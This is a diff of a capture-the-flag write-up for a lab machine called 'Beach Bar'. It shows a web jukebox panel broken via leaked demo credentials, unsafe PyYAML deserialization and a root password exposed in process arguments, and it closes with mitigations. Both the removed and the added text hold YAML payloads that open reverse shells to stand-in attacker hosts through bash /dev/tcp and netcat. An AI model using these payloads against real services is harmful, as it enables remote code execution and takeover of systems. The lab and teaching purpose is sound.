@@ -301,30 +301,112 @@ Endpoint Detection & Response (EDR): Deploy behavior-based endpoint detection to
 ---
 
 # Day 5: Beach Bar
-* **Category:** Web Exploitation & PrivEsc / Unsafe Deserialization
-* **Target System:** Beach Bar Order Management Web Portal
+ 
+**Category:** Web Exploitation / Unsafe Deserialization / Privilege Escalation  
+**Difficulty:** Medium  
 
-### Objective
-Exploit unsafe PyYAML deserialization on order upload parameters to execute arbitrary code, obtain an initial reverse shell, and elevate privileges.
+### Step 1 : Initial Access: Exposed Credentials
 
-### Step-by-Step Execution
+Navigating to the target address presents the Beach Bar web application.
 
-1. **PyYAML Exploit Execution:**
-   * Intercept order import field accepting YAML text.
-   * Construct PyYAML payload leveraging `python/object/apply:subprocess.Popen`:
-     ```yaml
-     !!python/object/apply:subprocess.Popen
-     - ['/bin/bash', '-c', 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1']
-     ```
-   * Catch shell connection using local Netcat listener (`nc -lvnp 4444`).
+Inspecting the HTML page source reveals a development comment left by the staff:
 
-2. **Internal Credential Discovery:**
-   * Search application directory (`/var/www/app` or local `.env` configuration files).
-   * Discover hardcoded administrative credentials in `config.py`.
+```html
+<!-- staff note: the demo DJ login is still enabled for the soft opening. dj / dj -- swap this before the season starts (ticket BAR-7) -->
+```
+<img width="584" height="61" alt="vmware_EgysWdqHkf" src="https://github.com/user-attachments/assets/a5696f1b-fd89-4ec9-9b31-26d0f2ce8150" />
 
-3. **Privilege Escalation:**
-   * Inspect sudo permissions: `sudo -l`.
-   * Execute elevated commands or switch user (`su root`) with discovered credentials to read `/root/root.txt`.
+### Step 2. Using the disclosed credentials (dj / dj) grants successful authentication into the Jukebox control panel.
+
+Inside the control panel, exporting the current playlist yields a playlist.yml file structured as follows:
+
+<img width="321" height="241" alt="vmware_DG5Mcsb5Sy" src="https://github.com/user-attachments/assets/96789494-f798-4943-ab5b-4c5f114ca7e5" />
+
+The panel includes a playlist import feature. When a file is uploaded, the response displays the parsed output in Python dictionary syntax. This indicates Python is handling the backend processing and potentially using an unsafe YAML loader (PyYAML).
+
+### Step 3. Remote Code Execution (RCE)
+To test for unsafe YAML deserialization, construct a payload leveraging the Python constructor !!python/object/apply to execute subprocess.check_output:
+
+<img width="720" height="245" alt="vmware_4ZWDCiSxi8" src="https://github.com/user-attachments/assets/722a3a6d-3270-4e7a-b280-28605c882df8" />
+
+Uploading this payload causes the backend to execute id and render the output in the server response:
+
+```Python
+{'playlist': {'name': b'uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)\n', 'tracks': [{'artist': 'x', 'title': 'x'}]}}
+```
+
+This confirms arbitrary command execution under the bartender context.
+
+### Step 4. Obtaining a Reverse Shell
+Start a Netcat listener on your attack box:
+
+```Bash
+nc -lnvp 1234
+```
+
+Craft and import a YAML payload containing a FIFO reverse shell string:
+
+```Bash
+playlist:
+  name: !!python/object/apply:subprocess.check_output [["/bin/sh", "-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 1234 >/tmp/f"]]
+```
+(Replace ATTACKER_IP with your VPN IP address).
+
+Catch the incoming shell and upgrade it to a fully interactive TTY:
+
+```Bash
+python3 -c "import pty; pty.spawn('/bin/bash')"
+```
+<img width="541" height="115" alt="vmware_9wrXUKj8hl" src="https://github.com/user-attachments/assets/62e98ba0-8051-40f3-823c-37124d72ec6d" />
+
+### Step 5. User Flag
+Navigate to the bartender user's home directory to retrieve user.txt:
+
+<img width="486" height="75" alt="vmware_X3NrKJlWM5" src="https://github.com/user-attachments/assets/1d33c336-e0c2-4503-b291-5c5bc6813c19" />
+
+### Step 6. Privilege Escalation to Root
+With initial access secured, I then decieded to inspect all active processes on the machine:
+
+```Bash
+ps auxww
+```
+
+Among the running processes, a background daemon running as root exposes sensitive parameters directly in its command line invocation:
+
+<img width="777" height="36" alt="vmware_wIZlVp6Eip" src="https://github.com/user-attachments/assets/25cd6427-4816-476e-a785-740efa4c6d15" />
+
+The password --stream-pass SunsetSpritz2024! is exposed in plain text. Attempt switching to the root user using this credential:
+
+```Bash
+su root
+# Password: SunsetSpritz2024!
+```
+Authentication succeeds, granting full root privileges.
+
+### Step 7. Root Flag
+Retrieve the root flag located in /root:
+
+<img width="486" height="75" alt="vmware_X3NrKJlWM5" src="https://github.com/user-attachments/assets/8d728ed6-0589-453c-9ce2-69ec1f217a8d" />
+
+Key Takeaways & Mitigation
+Remove Hardcoded & Demo Credentials
+
+Issue: Dev notes and demo credentials (dj:dj) were left active in production source code.
+
+Fix: Purge development comments and disable default accounts before public deployment.
+
+Use Safe YAML Loaders
+
+Issue: Using standard yaml.load() in PyYAML allows instantiation of arbitrary Python objects.
+
+Fix: Always use yaml.safe_load() or specify Loader=yaml.SafeLoader when handling untrusted user input.
+
+Protect Process Arguments
+
+Issue: Passwords passed as command-line arguments are world-readable via ps.
+
+Fix: Store secrets in environment variables with strict permissions or secure configuration files rather than passing them via CLI arguments.
+
 
 ---
 
